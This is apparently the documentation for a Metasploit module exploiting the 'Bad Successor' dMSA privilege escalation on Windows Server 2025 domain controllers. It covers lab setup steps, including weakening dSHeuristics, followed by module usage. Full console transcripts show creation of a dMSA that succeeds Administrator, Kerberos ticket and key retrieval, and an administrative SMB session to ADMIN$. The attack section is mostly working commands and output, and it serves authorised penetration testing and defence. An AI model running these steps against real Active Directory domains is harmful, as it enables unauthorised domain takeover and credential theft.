## Vulnerable Application

This module exploits 'Bad Successor', which allows operators to elevate privileges on domain controllers
running at the Windows 2025 forest functional level. Microsoft decided to introduce Delegated Managed Service
Accounts (dMSA) in this forest level and they came ripe for exploitation.

Normal users can't create dMSA accounts where dMSA accounts are supposed to be created, the Managed Service
Accounts OU, but if a normal user has write access to any other OU they can then create a dMSA account in
said OU. After creating the account the user can edit LDAP attributes of the account to indicate that this
account should inherit privileges from the Administrator user. Once this is complete we can request kerberos
tickets on behalf of the dMSA account and voilà, you're admin.

The module has two actions, one for creating the dMSA account and setting it up to impersonate a high
privilege user, and another action for requesting the kerberos tickets needed to use the dMSA account for privilege
escalation.

## Setup
- Download the Windows Server 2025 .iso
- Install a new Windows Server 2025 instance.
- Rename the computer to `DC1` and hardcode the IP address.
- Promote the server to a domain controller for a new forest (e.g., `msf.local`).
- Set the domain functional level to Windows Server 2025.
- Once the domain controller is set up, create a `KdsRootKey` with an effective time at least 10 hours in the past:
```powershell
PS C:\Users\Administrator> Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)

Guid
----
6d0d01bb-f6e6-0f0c-7ec8-d65d2cbca174
```
- Verify the key has been created and the `EffectiveTime` is in the past successfully with the following command:
```
PS C:\Users\Administrator> Get-KdsRootKey


AttributeOfWrongFormat :
KeyValue               : {117, 226, 79, 104...}
EffectiveTime          : 11/17/2025 7:46:20 AM
CreationTime           : 11/17/2025 5:46:20 PM
IsFormatValid          : True
DomainController       : CN=DC5,OU=Domain Controllers,DC=msf,DC=test
ServerConfiguration    : Microsoft.KeyDistributionService.Cmdlets.KdsServerConfiguration
KeyId                  : 6d0d01bb-f6e6-0f0c-7ec8-d65d2cbca174
VersionNumber          : 1
```
- Create an Organizational Unit (OU) to contain the dMSA accounts:
```powershell
New-ADOrganizationalUnit -Name "testing" -Path "DC=msf,DC=local"
```
- Open Active Directory Users and Computers (ADUC) and delegate CreateAllChild permissions on the newly created OU to a low-privilege user.
- Select the new OU, right-click, and choose Properties
- Select the Security tab and click Advanced
- Click Add, then click Select a principal
- Enter the low-privilege user's name and click OK
- In the Permissions window, check the box for Create all child objects and click OK
- Ensure Type is set to "Allow"
- Ensure Applies to is set to "This object and all descendant objects" - important
- Click OK to apply the changes and close all dialog boxes.
- The low-privilege user should now have the necessary permissions to create dMSA accounts in the specified OU and edit
its attributes in order to be vulnerable to Bad Successor.
- Run the following command to ensure the domain controller has not had any hardening applied that might prevent BadSuccessor for being exploited:
```powershell
(Get-ADObject ("CN=Directory Service,CN=Windows NT,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Properties dSHeuristics).dSHeuristics
```
- If the output is blank, that means dSHeuristics is set to the default and the domain controller is vulnerable.
- If the output contains a value ensure that the 28th character is not set to '1' (e.g., `00000000010000000002000000000`)
- For testing purposes, if it is set to '1', you can set it to a vulnerable value with admin privileges and the following command:
```powershell
Set-ADObject ("CN=Directory Service,CN=Windows NT,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -replace @{dSHeuristics='00000000010000000002000000001'}
```

## Actions

There are two kind of actions the module can run:

1. **CREATE_DMSA** - Creates a dMSA account vulnerable to BadSuccessor. [Default]
2. **GET_TICKET** - Issues a kerberos ticket for the created dMSA account to gain elevated privileges.

## Verification Steps

1. Start msfconsole
1. Create a dMSA account and set it to impersonate Administrator:
1. Do: `use admin/ldap/bad_successor`
1. Do: `set ACTION CREATE_DMSA`
1. Do: `set RHOSTNAME <domain controller FQDN>`
1. Do: `set DMSA_ACCOUNT_NAME <dMSA account name>`
1. Do: `set ACCOUNT_TO_IMPERSONATE Administrator`
1. Do: `set LDAPDomain <domain name>`
1. Do: `set LDAPUsername <username>`
1. Do: `set LDAPPassword <password>`
1. Do: `set rhost <domain controller IP>`
1. Do: `run`
1. Use the created dMSA account to get elevated kerberos tickets:
1. Do: `set ACTION GET_TICKET`
1. Do: `set SERVICE cifs`
1. With all the other options the same as before, do: `run`

## Options

### DMSA_ACCOUNT_NAME

The name of the dMSA account to be created.

### ACCOUNT_TO_IMPERSONATE

The name of the account to impersonate using the dMSA.

### DC_FQDN

The fully qualified domain name (FQDN) of the domain controller.

## Scenarios

### Action: CREATE_DMSA
#### Create dMSA on a Windows 2025 Domain Controller
```
msf auxiliary(admin/ldap/bad_successor) > set RHOSTNAME dc5.msf.test
RHOSTNAME => dc5.msf.test
msf auxiliary(admin/ldap/bad_successor) > set DMSA_ACCOUNT_NAME attacker_dMSA
DMSA_ACCOUNT_NAME => attacker_dMSA
msf auxiliary(admin/ldap/bad_successor) > set LDAPDomain msf.test
LDAPDomain => msf.test
msf auxiliary(admin/ldap/bad_successor) > set LDAPPassword N0tpassword!
LDAPPassword => N0tpassword!
smsf auxiliary(admin/ldap/bad_successor) > set LDAPUsername msfuser
LDAPUsername => msfuser
msf auxiliary(admin/ldap/bad_successor) > set rhost 172.16.199.209
rhost => 172.16.199.209
msf auxiliary(admin/ldap/bad_successor) > run
[*] Discovering base DN automatically
[+] Found 3 OUs we can write to, listing them below:
[+]  - OU=Domain Controllers,DC=msf,DC=test
[+]  - OU=BadBois,DC=msf,DC=test
[+]  - OU=dMSA_Accounts,DC=msf,DC=test
[*] Attempting to create dmsa account cn: attacker_dMSA, dn: CN=attacker_dMSA,OU=dMSA_Accounts,DC=msf,DC=test
[+] Created dmsa attacker_dMSA
[*] Setting attributes for dMSA object: CN=attacker_dMSA,OU=dMSA_Accounts,DC=msf,DC=test
[+] Successfully updated attributes for dMSA object: CN=attacker_dMSA,OU=dMSA_Accounts,DC=msf,DC=test
[*] msds-delegatedmsastate => ["2"]
[*] msds-managedaccountprecededbylink => ["CN=Administrator,CN=Users,DC=msf,DC=test"]
[*] Auxiliary module execution completed
```

### Action: GET_TICKET
#### Elevate privileges using the created dMSA
```
msf auxiliary(admin/ldap/bad_successor) > set RHOSTNAME dc5.msf.test
RHOSTNAME => dc5.msf.test
msf auxiliary(admin/ldap/bad_successor) > set DMSA_ACCOUNT_NAME attacker_dMSA
DMSA_ACCOUNT_NAME => attacker_dMSA
msf auxiliary(admin/ldap/bad_successor) > set LDAPDomain msf.test
LDAPDomain => msf.test
msf auxiliary(admin/ldap/bad_successor) > set LDAPPassword N0tpassword!
LDAPPassword => N0tpassword!
smsf auxiliary(admin/ldap/bad_successor) > set LDAPUsername msfuser
LDAPUsername => msfuser
msf auxiliary(admin/ldap/bad_successor) > set rhost 172.16.199.209
rhost => 172.16.199.209
msf auxiliary(admin/ldap/bad_successor) > run
[*] Running module against 172.16.199.209
[*] Loading admin/kerberos/get_ticket
[*] 172.16.199.209:88 - Getting TGT for msfuser@msf.test
[+] 172.16.199.209:88 - Received a valid TGT-Response
[*] 172.16.199.209:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20251119215739_default_172.16.199.209_mit.kerberos.cca_626542.bin
[+] Obtained TGT for the user msfuser
[*] Using cached credential for krbtgt/MSF.TEST@MSF.TEST msfuser@MSF.TEST
[*] 172.16.199.209:88 - Getting TGS impersonating attacker_dMSA$@msf.test (SPN: krbtgt/msf.test)
[+] 172.16.199.209:88 - Received a valid TGS-Response
[*] 172.16.199.209:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20251119215741_default_172.16.199.209_mit.kerberos.cca_263687.bin
[*] dMSA Key Package:
[*]   Current Keys:
[+]     Type: AES256, Key: c1085cb36ef8c1e7d62693ba4e3402523c8a4c300591ac2fdd1643d0cd80e6ad
[+]     Type: AES128, Key: ce576bbe6386f5aaee691192ecf0684a
[+]     Type: RC4, Key: 9857452d6e592835e9b4ef337c1be5c8
[*]   Previous Keys:
[+]     Type: RC4, Key: 4fd408d8f8ecb20d4b0768a0ac44b71f
[+] Obtained TGT for dMSA attacker_dMSA
[*] Using cached credential for krbtgt/MSF.TEST@MSF.TEST attacker_dMSA$@msf.test
[*] 172.16.199.209:88 - Getting TGS for attacker_dMSA$@msf.test (SPN: cifs/dc5.msf.test)
[+] 172.16.199.209:88 - Received a valid TGS-Response
[*] 172.16.199.209:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20251119215742_default_172.16.199.209_mit.kerberos.cca_858140.bin
[+] 172.16.199.209:88 - Received a valid delegation TGS-Response
[+] Obtained elevated TGT for attacker_dMSA
[*] Auxiliary module execution completed
```

### Use ticket to connect to the ADMIN$ SMB share
```
msf auxiliary(scanner/smb/smb_login) > set username attacker_dMSA$
username => attacker_dMSA$
msf auxiliary(scanner/smb/smb_login) > set rhost 172.16.199.209
rhost => 172.16.199.209
msf auxiliary(scanner/smb/smb_login) > set domaincontrollerrhost 172.16.199.209
domaincontrollerrhost => 172.16.199.209
msf auxiliary(scanner/smb/smb_login) > set SMB::Rhostname dc5.msf.test
SMB::Rhostname => dc5.msf.test
msf auxiliary(scanner/smb/smb_login) > set SMB::Auth kerberos
SMB::Auth => kerberos
msf auxiliary(scanner/smb/smb_login) > set SMB::Krb5Ccname
SMB::Krb5Ccname =>
msf auxiliary(scanner/smb/smb_login) > set SMB::Krb5Ccname /Users/jheysel/.msf4/loot/20251119215742_default_172.16.199.209_mit.kerberos.cca_858140.bin
SMB::Krb5Ccname => /Users/jheysel/.msf4/loot/20251119215742_default_172.16.199.209_mit.kerberos.cca_858140.bin
msf auxiliary(scanner/smb/smb_login) > run
[*] 172.16.199.209:445    - 172.16.199.209:445 - Starting SMB login bruteforce
[*] 172.16.199.209:445    - Loaded a credential from ticket file: /Users/jheysel/.msf4/loot/20251119215742_default_172.16.199.209_mit.kerberos.cca_858140.bin
[+] 172.16.199.209:445    - 172.16.199.209:445 - Success: 'msf.test\attacker_dMSA$:' Administrator
[*] SMB session 3 opened (172.16.199.1:33643 -> 172.16.199.209:445) at 2025-11-19 22:23:14 -0800
[*] 172.16.199.209:445    - Scanned 1 of 1 hosts (100% complete)
[*] 172.16.199.209:445    - Bruteforce completed, 1 credential was successful.
[*] 172.16.199.209:445    - 1 SMB session was opened successfully.
[*] Auxiliary module execution completed
msf auxiliary(scanner/smb/smb_login) > sessions -i

Active sessions
===============

  Id  Name  Type  Information                              Connection
  --  ----  ----  -----------                              ----------
  3         smb   SMB attacker_dMSA$ @ 172.16.199.209:445  172.16.199.1:33643 -> 172.16.199.209:445 (172.16.199.209)

msf auxiliary(scanner/smb/smb_login) > sessions -i -1
[*] Starting interaction with 3...

SMB (172.16.199.209) > shares
Shares
======

    #  Name      Type          comment
    -  ----      ----          -------
    0  ADMIN$    DISK|SPECIAL  Remote Admin
    1  C$        DISK|SPECIAL  Default share
    2  IPC$      IPC|SPECIAL   Remote IPC
    3  NETLOGON  DISK          Logon server share
    4  SYSVOL    DISK          Logon server share
    
SMB (172.16.199.209) > shares -i ADMIN$
[+] Successfully connected to ADMIN$
SMB (172.16.199.209\ADMIN$) > pwd
Current directory is \\172.16.199.209\ADMIN$\
```
